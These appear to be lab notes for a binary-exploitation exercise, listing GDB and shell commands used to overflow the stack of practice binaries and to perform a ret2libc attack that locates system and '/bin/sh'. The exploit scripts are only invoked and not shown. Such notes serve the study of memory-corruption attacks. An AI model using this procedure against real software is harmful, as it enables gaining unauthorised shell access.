# `overflow.x86.no`

## Debug session with GDB

    break *(return_input+32)

    run < <(python ./exploit.py -r 0xffffd4f8)

    hexdump $sp-0x100 0x200

    nearpc $sp+8 10

## Shell session

    ulimit -c unlimited

    ./overflow.x86.no < <(python exploit.py -r 0xffffd4f8)

    gdb ./overflow.x86.no core

    ./overflow.x86.no < <(python exploit.py -r 0xffffd548)

    python exploit.py -r 0xffffd558 | ./overflow.x86.no

# `victim.x86.no`

## Shell session
    
    ulimit -c unlimited

    sudo sysctl -w kernel.core_pattern=core

    python exploit_victim.py -r 0xdeadbeef | xargs ./victim.x86.no

    ./victim.x86.no $(python exploit_victim.py -r 0xdeadbeef)

    gdb ./victim.x86.no core

    ./victim.x86.no $(python exploit_victim.py -r 0xffffd2e0)

## Debug session with GDB
    
    run $(python exploit_victim.py -r 0xffffd2a0)


# Ret2libc of `victim.x86.no.nx`

    gdb ./victim.x86.no.nx

    print system

    search -s '/bin/sh'

    hexdump 0xf7f6ea0b 10

    ./victim.x86.no.nx $(python exploit_r2l.py)


